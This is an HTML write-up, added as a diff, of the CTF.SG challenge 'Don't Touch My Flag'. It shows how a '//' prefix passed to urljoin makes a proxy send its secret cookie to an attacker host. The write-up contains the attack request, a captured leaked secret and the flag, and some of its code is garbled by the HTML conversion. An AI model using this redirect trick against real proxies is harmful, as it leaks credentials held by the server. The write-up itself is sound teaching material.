@@ -1,0 +1,89 @@
+<h1>Don't Touch My Flag</h1>
+
+<blockquote>
+  <p>I found a flag on a server, though access seems to be protected by a secret. Being generous, I decided to share the flag with you through my proxy server.\
+  \
+  Oh, the censoring? Sorry about that, I'll remove it after this CTF is over.\
+  \
+  http://chals.ctf.sg:40101\
+  http://chals.ctf.sg:40102\
+  \
+  author: JustinOng</p>
+</blockquote>
+
+<p>This challenge consists of two servers - a proxy and a backend.</p>
+
+<p>Let's take a look at how the proxy makes the request to the backend. The secret token is added to the cookies, and a user-controlled <code>uri</code> is joined to the backend URL using <code>urllib.parse.urljoin</code>.</p>
+
+<p>```python
+@app.route("/get")
+def get():
+    uri = request.args.get("uri", "/")
+    full<em>url = urllib.parse.urljoin(os.environ["BACKEND</em>URL"], uri)</p>
+
+<pre><code>r = requests.get(full_url, cookies={
+    "secret": secret
+})
+if r.status_code != 200:
+    return f"Request failed: received status code {r.status_code}"
+
+censored = censor(r.text)
+return censored
+</code></pre>
+
+<p>```</p>
+
+<p>But <code>urljoin</code> doesn't fare well when presented with a malformed path.</p>
+
+<p>```python</p>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <p>from urllib.parse import urljoin
+      urljoin("http://www.example.com", "test")
+      'http://www.example.com/test'
+      urljoin("http://www.example.com", "/test")
+      'http://www.example.com/test'
+      urljoin("http://www.example.com", "//test")
+      'http://test'
+      ```</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<p>This allows us to get the proxy to make a request to our own server:</p>
+
+<p><code>http
+GET /get?uri=//ATTACKER-URL HTTP/1.1
+Host: chals.ctf.sg:40101
+</code></p>
+
+<p>In the received request, we get the secret cookie.</p>
+
+<p>```http
+GET / HTTP/1.1
+Host: ae64-42-60-216-15.ngrok.io
+User-Agent: python-requests/2.27.1
+Accept: <em>/</em>
+Accept-Encoding: gzip, deflate
+Cookie: secret=8byEt7F60cCSRpQs1jeAXQqByOsK5P5b
+X-Forwarded-For: 178.128.25.242
+X-Forwarded-Proto: http</p>
+
+<p>```</p>
+
+<p>Now we can send a request directly to the backend, which checks our secret before giving us the flag!</p>
+
+<p>```python
+@app.route("/flag")
+def get_flag():
+    if request.cookies.get("secret") != secret:
+        return "\N{Black Flag}"</p>
+
+<pre><code>return flag
+</code></pre>
+
+<p>```</p>
+
+<p>The flag is <code>CTFSG{d0nT_toUcH_mY_c00k13s}</code></p>
